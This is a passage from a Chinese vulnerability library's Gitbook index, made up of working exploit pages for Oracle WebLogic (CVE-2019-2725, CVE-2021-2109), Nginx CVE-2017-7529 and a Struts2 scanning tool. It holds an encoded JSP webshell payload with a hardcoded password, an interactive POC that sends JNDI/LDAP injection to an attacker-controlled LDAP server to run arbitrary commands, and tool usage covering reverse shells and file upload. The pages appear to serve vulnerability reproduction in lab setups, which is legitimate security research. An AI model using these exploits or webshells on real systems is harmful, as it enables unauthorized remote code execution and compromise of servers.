QAKQAfAAEAKgAAABMAAv8AHQACBwArBwArAAEHADQXADAAAAAEAAEANQAJADYANwACABcAAAArAAAAAQAAAAGxAAAAAgAYAAAABgABAAAANgAZAAAADAABAAAAAQA4ADkAAAAwAAAABAABADUAAQA6AAAAAgA7 ResultBaseExec %s connectionHandler true '''%(cmd) url=\"%s/wls-wsat/CoordinatorPortType\"%(ip) rsp = requests.post(url, data=body, verify=False, headers=headers) logger.info(\"\\r\\n\"+rsp.text) def webshell_10_3_6(ip): body=''' oracle.toplink.internal.sessions.UnitOfWorkChangeSet -84-19051151140231069711897461171161051084676105110107101100729711510483101116-40108-4190-107-35423020012011401710697118974611711610510846729711510483101116-7068-123-107-106-72-735230012011211912000166364000002115114058991111094611511711046111114103469711297991041014612097108971104610511011610111411097108461201151081169946116114971204684101109112108971161011157310911210898779-63110-84-855130973013951051101001011101167811710998101114730149511611497110115108101116731101001011209002195117115101831011141181059910111577101991049711010511510976025959799991011151156912011610111411097108831161211081011151041011011161160187610697118974710897110103478311611410511010359760119597117120671089711511510111511605976991111094711511711047111114103479711297991041014712097108971104710511011610111411097108471201151081169947114117110116105109101477297115104116979810810159910109598121116101991111001011151160391916691069599108971151151160189176106971189747108971101034767108971151155976059511097109101113012604760179511111711611211711680114111112101114116105101115116022761069711897471171161051084780114111112101114116105101115591201120000-1-1-1-1011603971081081121171140391916675-32521103103-37552001201120002117114029166-84-1323-86884-322001201120011-123-54-2-70-6600050081100303470797037703810161151011141059710886101114115105111110857368101741013671111101151169711011686971081171015-8332-109-13-111-35-176210660105110105116621034041861046711110010110157610511010178117109981011148497981081011018761119997108869711410597981081018497981081011041161041051151019831161179884114971101151081011168097121108111971001012731101101011146710897115115101115105376121115111115101114105971084711297121108111971001154711711610510847719710010310111611536831161179884114971101151081011168097121108111971005910911611497110115102111114109101144076991111094711511711047111114103479711297991041014712097108971104710511011610111411097108471201151081169947687977599176991111094711511711047111114103479711297991041014712010910847105110116101114110971084711510111410597108105122101114478310111410597108105122971161051111107297110100108101114594186108100111991171091011101161045769911110947115117110471111141034797112979910410147120971089711047105110116101114110971084712011510811699476879775910810497110100108101114115106691769911110947115117110471111141034797112979910410147120109108471051101161011141109710847115101114105971081051221011144783101114105971081051229711610511111072971101001081011145910106912099101112116105111110115703910-9040769911110947115117110471111141034797112979910410147120971089711047105110116101114110971084712011510811699476879775976991111094711511711047111114103479711297991041014712010910847105110116101114110971084710011610947688477651201051157311610111497116111114597699111109471151171104711111410347971129799104101471201091084710511011610111411097108471151011141059710810512210111447831011141059710810512297116105111110729711010010810111459418610810511610111497116111114105376991111094711511711047111114103479711297991041014712010910847105110116101114110971084710011610947688477651201051157311610111497116111114591071049711010010810111410657699111109471151171104711111410347971129799104101471201091084710511011610111411097108471151011141059710810512210111447831011141059710810512297116105111110729711010010810111459101083111117114991017010510810110127197100103101116115461069711897120100117040105112111511111510111410597108471129712110811197100115471171161051084771971001031011161153683116117988411497110115108101116809712110811197100106499111109471151171104711111410347971129799104101471209710897110471051101161011141109710847120115108116994711411711011610510910147659811511611497991168411497110115108101116102010697118974710511147831011141059710810512297981081011057991111094711511711047111114103479711297991041014712097108971104710511011610111411097108471201151081169947841149711011510810111669120991011121161051111101031121115111115101114105971084711297121108111971001154711711610510847719710010310111611510860991081051101051166213-10480678665737266104905085103987170117905186104905085577310911210410010969105737178118981108210898110828510188661088083744890881044876501044898871195573717811189887412290888157824874767310311110373676510399717011090858611789505710797875311080837486866989116796773108801031115673858280814982908569851039772821169867668186857477838577103731054811876499912281121561188270826973691048584851191037867521197783668599109701179950108489787571178987119118764886797310565105977282489968111118765110051100121535177121531189910999118867073118977282116986881118987157118995085117907282107731065275807110448988711943671056510373676556891095710710184527573676510373676510373676556748111110373676510373676510373711081097367103105898782116978752105761098612010087701159912110412190887049908878487610910010810070661049910970116908882108991051031059972100107731051071127583665567105651037367651037367651037367651037371112104100109691179787561178387531191008882841007274108898748103978753119100888110380836683100875348978749108761091001081007074499811082112988785111758353108101718610675727410899888610899518111790508648857170121898749108100718612175677410698878110575831071179050864883875311910088828410072741088987481117584115757367651037367651037367651037367651039787534873711201089810565577367481207911911110373676510373676510373676510373676610510188821088749481038911010848908877103808366117908899103891101084890861154877681071218884115757367651037367651037367651037367651039851864876110661219787534875677356997274108801057311279119111103736765103736765103736765103736766519771108115908365111757112010898105655773711081179972864876110741088987811118911010848908877112758365104808365116778310710310111911110373676510373676510373676510373676510373676510398518648761106612197875348987152111981098651737078489910910811790121104105101888210899121119103731071006783121731127584115757367651037367651037367651037367651031028111110373676510373676510373676510373676611810088811179972741129811081111731061191189972741088010573112791191111037367651037367651037372487573676510373678543671056510373676556765074118907210743671031115676501044898871194367103616180421016106971189747108971101034783116114105110103704410221151171104710910511599476665836954526810199111100101114704610047034102511511711047109105115994767104971149799116101114681019911110010111470491012100101991111001016611710210210111410224076106971189747108971101034783116114105110103594191661205105210050053105409166418612010055100450561019106971189747105111478011410511011687114105116101114705810731151011141181011141154765100109105110831011141181011144711610911247958776951051101161011141109710847981019795119108115951051101161011141109710847571065210011310747119971144710010110911146106115112806010214076106971189747108971101034783116114105110103594186120100621005906310711211410511011610811012065062100590661059910811111510112068011100590691019106971189747108971101034769120991011121161051111107071101910697118974710897110103478410411411111997981081017073101511211410511011683116979910784114979910112075011100740761013831169799107779711284979810810110291211151111151011141059710847801191101011145156534849565049545551554954103176121115111115101114105971084780119110101114515653484956504954555155495459033020301040102605060107000208040101001101012000470101000542-7301-79000201300060100047014000120100050150800001019020020120006300030001-79000201300060100052014000320300010150800000010210220100010230240202500040102601019027020120007300040001-7900020130006010005601400042040001015080000001021022010001028029020001030031030250004010260804101101012000102050500060-8903176184377-6904589-6904789-7304844-74054-7305777-69059891861-73064784544-7406745-74070-89013584254-74077-8903-7901050460490720107800016033-104502050170729020320002033017000100102035016091171130126013001-44-54-2-70-6600050027100302170237024702510161151011141059710886101114115105111110857368101741013671111101151169711011686971081171015113-26105-1860109712410660105110105116621034041861046711110010110157610511010178117109981011148497981081011018761119997108869711410597981081018497981081011041161041051151037011111110127311011010111467108971151151011151037761211151111151011141059710847112971211081119710011547117116105108477197100103101116115367011111159101083111117114991017010510810110127197100103101116115461069711897120100117026103512111511111510111410597108471129712110811197100115471171161051084771971001031011161153670111111101610697118974710897110103477998106101991161020106971189747105111478310111410597108105122979810810110311211151111151011141059710847112971211081119710011547117116105108477197100103101116115033020301040102605060107000208010101001101012000470101000542-7301-79000201300060100060014000120100050150180002019000202001700010010202201609112116048011911011411211910120115125000102910697118971204612010910846116114971101151021111141094684101109112108971161011151201140231069711897461089711010346114101102108101991164680114111120121-3139-3832-521667-53201760110411603776106971189747108971101034711410110210810199116477311011811199971161051111107297110100108101114591201121151140501151171104611410110210810199116469711011011111697116105111110466511011011111697116105111110731101181119997116105111110729711010010810111485-54-111521-53126-912027601210910110998101114869710811710111511601576106971189747117116105108477797112597604116121112101116017761069711897471089711010347671089711511559120112115114017106971189746117116105108467297115104779711257-38-63-612296-47302700101081119710070979911611111473091161041141011151041111081001201126364000001211980001600011160810253975397544856113012609120118114029106971189712046120109108461161149711011510211111410946841011091121089711610111500000000000120112120 ''' url=\"%s/wls-wsat/CoordinatorPortType\"%(ip) rsp = requests.post(url, data=body, verify=False, headers=headers) logger.info(\"\\r\\nShell地址： %s/bea_wls_internal/demo.jsp?pwd=admin&cmd=ipconfig\"%(ip)) #print(\"Shell地址： %s/bea_wls_internal/demo.jsp?pwd=admin&cmd=ipconfig\"%(ip)) def webshell_12_1_3(ip): body=''' org.slf4j.ext.EventData servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/demo.jsp &#x3c;&#x25;&#x40;&#x20;&#x70;&#x61;&#x67;&#x65;&#x20;&#x6c;&#x61;&#x6e;&#x67;&#x75;&#x61;&#x67;&#x65;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x22;&#x20;&#x63;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x54;&#x79;&#x70;&#x65;&#x3d;&#x22;&#x74;&#x65;&#x78;&#x74;&#x2f;&#x68;&#x74;&#x6d;&#x6c;&#x3b;&#x20;&#x63;&#x68;&#x61;&#x72;&#x73;&#x65;&#x74;&#x3d;&#x47;&#x42;&#x4b;&#x22;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x70;&#x61;&#x67;&#x65;&#x45;&#x6e;&#x63;&#x6f;&#x64;&#x69;&#x6e;&#x67;&#x3d;&#x22;&#x55;&#x54;&#x46;&#x2d;&#x38;&#x22;&#x25;&#x3e;&#x0a;&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x68;&#x74;&#x6d;&#x6c;&#x20;&#x50;&#x55;&#x42;&#x4c;&#x49;&#x43;&#x20;&#x22;&#x2d;&#x2f;&#x2f;&#x57;&#x33;&#x43;&#x2f;&#x2f;&#x44;&#x54;&#x44;&#x20;&#x48;&#x54;&#x4d;&#x4c;&#x20;&#x34;&#x2e;&#x30;&#x31;&#x20;&#x54;&#x72;&#x61;&#x6e;&#x73;&#x69;&#x74;&#x69;&#x6f;&#x6e;&#x61;&#x6c;&#x2f;&#x2f;&#x45;&#x4e;&#x22;&#x20;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x77;&#x77;&#x77;&#x2e;&#x77;&#x33;&#x2e;&#x6f;&#x72;&#x67;&#x2f;&#x54;&#x52;&#x2f;&#x68;&#x74;&#x6d;&#x6c;&#x34;&#x2f;&#x6c;&#x6f;&#x6f;&#x73;&#x65;&#x2e;&#x64;&#x74;&#x64;&#x22;&#x3e;&#x0a;&#x3c;&#x68;&#x74;&#x6d;&#x6c;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x62;&#x6f;&#x64;&#x79;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x25;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x69;&#x66;&#x20;&#x28;&#x22;&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x22;&#x2e;&#x65;&#x71;&#x75;&#x61;&#x6c;&#x73;&#x28;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x67;&#x65;&#x74;&#x50;&#x61;&#x72;&#x61;&#x6d;&#x65;&#x74;&#x65;&#x72;&#x28;&#x22;&#x70;&#x77;&#x64;&#x22;&#x29;&#x29;&#x29;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x69;&#x6f;&#x2e;&#x49;&#x6e;&#x70;&#x75;&#x74;&#x53;&#x74;&#x72;&#x65;&#x61;&#x6d;&#x20;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x20;&#x3d;&#x20;&#x52;&#x75;&#x6e;&#x74;&#x69;&#x6d;&#x65;&#x2e;&#x67;&#x65;&#x74;&#x52;&#x75;&#x6e;&#x74;&#x69;&#x6d;&#x65;&#x28;&#x29;&#x2e;&#x65;&#x78;&#x65;&#x63;&#x28;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x67;&#x65;&#x74;&#x50;&#x61;&#x72;&#x61;&#x6d;&#x65;&#x74;&#x65;&#x72;&#x28;&#x22;&#x63;&#x6d;&#x64;&#x22;&#x29;&#x29;&#x2e;&#x67;&#x65;&#x74;&#x49;&#x6e;&#x70;&#x75;&#x74;&#x53;&#x74;&#x72;&#x65;&#x61;&#x6d;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x69;&#x6e;&#x74;&#x20;&#x6c;&#x65;&#x6e;&#x20;&#x3d;&#x20;&#x2d;&#x31;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x62;&#x79;&#x74;&#x65;&#x5b;&#x5d;&#x20;&#x62;&#x79;&#x74;&#x65;&#x73;&#x20;&#x3d;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x62;&#x79;&#x74;&#x65;&#x5b;&#x34;&#x30;&#x39;&#x32;&#x5d;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x6f;&#x75;&#x74;&#x2e;&#x70;&#x72;&#x69;&#x6e;&#x74;&#x28;&#x22;&#x3c;&#x70;&#x72;&#x65;&#x3e;&#x22;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x77;&#x68;&#x69;&#x6c;&#x65;&#x20;&#x28;&#x28;&#x6c;&#x65;&#x6e;&#x20;&#x3d;&#x20;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x2e;&#x72;&#x65;&#x61;&#x64;&#x28;&#x62;&#x79;&#x74;&#x65;&#x73;&#x29;&#x29;&#x20;&#x21;&#x3d;&#x20;&#x2d;&#x31;&#x29;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x6f;&#x75;&#x74;&#x2e;&#x70;&#x72;&#x69;&#x6e;&#x74;&#x6c;&#x6e;&#x28;&#x6e;&#x65;&#x77;&#x20;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x62;&#x79;&#x74;&#x65;&#x73;&#x2c;&#x20;&#x22;&#x47;&#x42;&#x4b;&#x22;&#x29;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x6f;&#x75;&#x74;&#x2e;&#x70;&#x72;&#x69;&#x6e;&#x74;&#x28;&#x22;&#x3c;&#x2f;&#x70;&#x72;&#x65;&#x3e;&#x22;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x25;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x62;&#x6f;&#x64;&#x79;&#x3e;&#x0a;&#x0a;&#x3c;&#x2f;&#x68;&#x74;&#x6d;&#x6c;&#x3e; ]]> ''' url=\"%s/wls-wsat/CoordinatorPortType\"%(ip) rsp = requests.post(url, data=body, verify=False, headers=headers) logger.info(\"\\r\\nShell地址： %s/bea_wls_internal/demo.jsp?pwd=admin&cmd=ipconfig\"%(ip)) if __name__=='__main__': info='''命令执行： python weblogic-2019-2725.py 10.3.6 http//:127.0.0.1:7001 cmd python weblogic-2019-2725.py 12.1.3 http//:127.0.0.1:7001 cmd 上传webshell python weblogic-2019-2725.py 10.3.6 http//:ip:port python weblogic-2019-2725.py 12.1.3 http//:ip:port ''' print(info) if len(sys.argv)==3: if sys.argv[1] ==\"10.3.6\": webshell_10_3_6(sys.argv[2]) elif sys.argv[1] ==\"12.1.3\": webshell_12_1_3(sys.argv[2]) else: logger.error(\"参数传入错误\") elif len(sys.argv)==4: if sys.argv[1] ==\"10.3.6\": weblogic_10_3_6(sys.argv[2],sys.argv[3]) elif sys.argv[1] ==\"12.1.3\": weblogic_12_1_3(sys.argv[2],sys.argv[3]) else: logger.error(\"参数传入错误\") else: logger.error(\"参数传入错误\") 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Weblogic/Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109.html":{"url":"book/Web服务器漏洞/Weblogic/Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109.html","title":"Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109","keywords":"","body":"Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109 漏洞描述 2021年1月20日，绿盟科技监测发现Oracle官方发布了2021年1月关键补丁更新公告CPU（Critical Patch Update），共修复了329个不同程度的漏洞，其中包括7个影响WebLogic的严重漏洞（CVE-2021-1994、CVE-2021-2047、CVE-2021-2064、CVE-2021-2108、CVE-2021-2075、CVE-2019-17195、CVE-2020-14756），未经身份验证的攻击者可通过此次的漏洞实现远程代码执行。CVSS评分均为9.8，利用复杂度低。建议用户尽快采取措施，对上述漏洞进行防护。 漏洞影响 [!NOTE] WebLogic Server 10.3.6.0.0 WebLogic Server 12.1.3.0.0 WebLogic Server 12.2.1.3.0 WebLogic Server 12.2.1.4.0 WebLogic Server 14.1.1.0.0 环境搭建 git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/CVE-2020-14882 docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:7001 正常即可 漏洞复现 访问一下URL http://xxx.xxx.xxx.xxx:7001/console/css/%252e%252e%252f/consolejndi.portal 如果有此页面未授权可访问，且在影响范围内则可能出现漏洞 下载漏洞攻击需要的 LDAP启动脚本 下载链接 下载到服务器上启动 java -jar JNDIExploit-v1.11.jar -i xxx.xxx.xxx.xxx (服务器地址) [!NOTE] 部分服务器注意放行端口 然后配合 Weblogic未授权范围 命令执行 /console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22) [!NOTE] 注意 ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho 这里 LDAP服务器地址第三个分隔符号为 ; 登录后台可使用此POC，未授权的话用上面的 /console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22) 漏洞利用POC [!NOTE] 注意参数格式 Ldap >>> ldap://xxx.xxx.xxx;xxx:1389 中的分号 如果使用其他的利用Ldap服务请自行更改 POC关键字 此POC仅仅检验有未授权的情况 import requests import sys import re requests.packages.urllib3.disable_warnings() from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Weblogic 多个版本 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mLDAP >>> ldap://xxx.xxx.xxx;xxx:1389 \\033[0m') print('+------------------------------------------') def POC_1(target_url, ldap_url, cmd): vuln_url = target_url + \"/console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22{}/Basic/WeblogicEcho;AdminServer%22)\".format(ldap_url) print('\\033[36m[o] 正在请求: {}'.format(vuln_url)) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"cmd\": cmd } try: response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"root:\" in response.text: print(\"\\033[32m[o] 目标{}存在漏洞 \\033[0m\".format(target_url)) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] 命令执行失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请检查参数和Ldap服务是否正确 \\033[0m\", e) def POC_2(target_url, ldap_url, cmd): vuln_url = target_url + \"/console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22{}/Basic/WeblogicEcho;AdminServer%22)\".format(ldap_url) print('\\033[36m[o] 正在请求: {}'.format(vuln_url)) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"cmd\": cmd } try: response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response)) except Exception as e: print(\"\\033[31m[x] 请检查参数和Ldap服务是否正确 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) ldap_url = str(input(\"\\033[35mLdap >>> \\033[0m\")) POC_1(target_url, ldap_url, cmd=\"cat /etc/passwd\") while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, ldap_url, cmd) Goby & POC [!NOTE] Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109 注意漏洞验证 Ldap参数同样跟上面的POC一样格式，注意分号 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Nginx/":{"url":"book/Web服务器漏洞/Nginx/","title":"Nginx","keywords":"","body":"Nginx Nginx越界读取缓存漏洞 CVE-2017-7529 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Nginx/Nginx越界读取缓存漏洞 CVE-2017-7529.html":{"url":"book/Web服务器漏洞/Nginx/Nginx越界读取缓存漏洞 CVE-2017-7529.html","title":"Nginx越界读取缓存漏洞 CVE-2017-7529","keywords":"","body":"Nginx越界读取缓存漏洞 CVE-2017-7529 漏洞描述 Nginx在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括“文件头”+“HTTP返回包头”+“HTTP返回包体”。如果二次请求命中了该缓存文件，则Nginx会直接将该文件中的“HTTP返回包体”返回给用户。 如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能就可以读取到缓存文件中位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。 影响版本 [!NOTE] Nginx version 0.5.6 - 1.13.2 环境搭建 git clone https://github.com/vulhub/vulhub.git cd vulhub/nginx/CVE-2017-7529 docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:8080 正常即可 漏洞复现 使用目录下的POC进行验证 python poc.py http://xxx.xxx.xxx.xxx:8080/ 漏洞利用POC #!/usr/bin/env python import sys import requests if len(sys.argv) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/":{"url":"book/Web服务器漏洞/Apache/","title":"Apache","keywords":"","body":"Apache Apache Cocoon Apache Flink Apache HTTPd Apache Kylin Apache Mod_jk Apache Shiro Apache Solr Apache Struts2 Apache Tomcat Apache ActiveMQ Apache Druid Apache ZooKeeper 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Struts2/":{"url":"book/Web服务器漏洞/Apache/Apache Struts2/","title":"Apache Struts2","keywords":"","body":"Apache Struts2 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Struts2/Scan/":{"url":"book/Web服务器漏洞/Apache/Apache Struts2/Scan/","title":"扫描工具","keywords":"","body":"扫描工具 Exphub Apache Struts2 Struts2-Scan 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Struts2/Scan/扫描工具 Struts2-Scan.html":{"url":"book/Web服务器漏洞/Apache/Apache Struts2/Scan/扫描工具 Struts2-Scan.html","title":"扫描工具 Struts2-Scan","keywords":"","body":"Struts2-Scan 漏洞验证 工具地址 Struts2-Scan 工具描述 Struts2漏洞利用扫描工具，基于互联网上已经公开的Structs2高危漏洞exp的扫描利用工具，目前支持的漏洞如下: S2-001, S2-003, S2-005, S2-007, S2-008, S2-009, S2-012, S2-013, S2-015, S2-016, S2-019, S2-029, S2-032, S2-033, S2-037, S2-045, S2-046, S2-048, S2-052, S2-053, S2-devMode, S2-057 支持单个URL漏洞检测和批量URL检测，至此指定漏洞利用，可获取WEB路径，执行命令，反弹shell和上传文件，注意，并不是所有的漏洞均支持上述功能，只有部分功能支持 运行环境 Python3.6.X及其以上版本 第三方库: click, requests, bs4 测试环境: Ubuntu 16.04 漏洞环境已上传，参考地址： https://github.com/Medicean/VulApps/tree/master/s/struts2/ https://github.com/vulhub/vulhub/tree/master/struts2 工具参数 Usage: Struts2Scan.py [OPTIONS] Struts2批量扫描利用工具 Options: -i, --info 漏洞信息介绍 -v, --version 显示工具版本 -u, --url TEXT URL地址 -n, --name TEXT 指定漏洞名称, 漏洞名称详见info -f, --file TEXT 批量扫描URL文件, 一行一个URL -d, --data TEXT POST参数, 需要使用的payload使用{exp}填充, 如: name=test&passwd={exp} -c, --encode TEXT 页面编码, 默认UTF-8编码 -p, --proxy TEXT HTTP代理. 格式为http://ip:port -t, --timeout TEXT HTTP超时时间, 默认10s -w, --workers TEXT 批量扫描进程数, 默认为10个进程 --header TEXT HTTP请求头, 格式为: key1=value1&key2=value2 -e, --exec 进入命令执行shell --webpath 获取WEB路径 -r, --reverse TEXT 反弹shell地址, 格式为ip:port --upfile TEXT 需要上传的文件路径和名称 --uppath TEXT 上传的目录和名称, 如: /usr/local/tomcat/webapps/ROOT/shell.jsp -q, --quiet 关闭打印不存在漏洞的输出，只保留存在漏洞的输出 -h, --help Show this message and exit. 使用例子 查看漏洞详细信息: $ python3 Struts2Scan.py --info ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] 支持如下Struts2漏洞: [+] S2-001:影响版本Struts 2.0.0-2.0.8; POST请求发送数据; 默认参数为:username,password; 支持获取WEB路径,任意命令执行和反弹shell [+] S2-003:影响版本Struts 2.0.0-2.0.11.2; GET请求发送数据; 支持任意命令执行 [+] S2-005:影响版本Struts 2.0.0-2.1.8.1; GET请求发送数据; 支持获取WEB路径,任意命令执行 [+] S2-007:影响版本Struts 2.0.0-2.2.3; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行和反弹shell [+] S2-008:影响版本Struts 2.1.0-2.3.1; GET请求发送数据; 支持任意命令执行和反弹shell [+] S2-009:影响版本Struts 2.0.0-2.3.1.1; GET请求发送数据,URL后面需要请求参数名; 默认为: key; 支持任意命令执行和反弹shell [+] S2-012:影响版本Struts Showcase App 2.0.0-2.3.13; GET请求发送数据,参数直接添加到URL后面; 默认为:name; 支持任意命令执行和反弹shell [+] S2-013/S2-014:影响版本Struts 2.0.0-2.3.14.1; GET请求发送数据; 支持获取WEB路径,任意命令执行,反弹shell和文件上传 [+] S2-015:影响版本Struts 2.0.0-2.3.14.2; GET请求发送数据; 支持任意命令执行和反弹shell [+] S2-016:影响版本Struts 2.0.0-2.3.15; GET请求发送数据; 支持获取WEB路径,任意命令执行,反弹shell和文件上传 [+] S2-019:影响版本Struts 2.0.0-2.3.15.1; GET请求发送数据; 支持获取WEB路径,任意命令执行,反弹shell和文件上传 [+] S2-029:影响版本Struts 2.0.0-2.3.24.1(除了2.3.20.3); POST请求发送数据,需要参数; 默认参数:message; 支持任意命令执行和反弹shell [+] S2-032:影响版本Struts 2.3.20-2.3.28(除了2.3.20.3和2.3.24.3); GET请求发送数据; 支持获取WEB路径,任意命令执行和反弹shell [+] S2-033:影响版本Struts 2.3.20-2.3.28(除了2.3.20.3和2.3.24.3); GET请求发送数据; 支持任意命令执行和反弹shell [+] S2-037:影响版本Struts 2.3.20-2.3.28.1; GET请求发送数据; 支持获取WEB路径,任意命令执行和反弹shell [+] S2-045:影响版本Struts 2.3.5-2.3.31,2.5-2.5.10; POST请求发送数据,不需要参数; 支持获取WEB路径,任意命令执行,反弹shell和文件上传 [+] S2-046:影响版本Struts 2.3.5-2.3.31,2.5-2.5.10; POST请求发送数据,不需要参数; 支持获取WEB路径,任意命令执行,反弹shell和文件上传 [+] S2-048:影响版本Struts 2.3.x with Struts 1 plugin and Struts 1 action; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行和反弹shell [+] S2-053:影响版本Struts 2.0.1-2.3.33,2.5-2.5.10; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行和反弹shell [+] S2-devMode:影响版本Struts 2.1.0-2.3.1; GET请求发送数据; 支持获取WEB路径,任意命令执行和反弹shell 单个URL漏洞检测: $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | 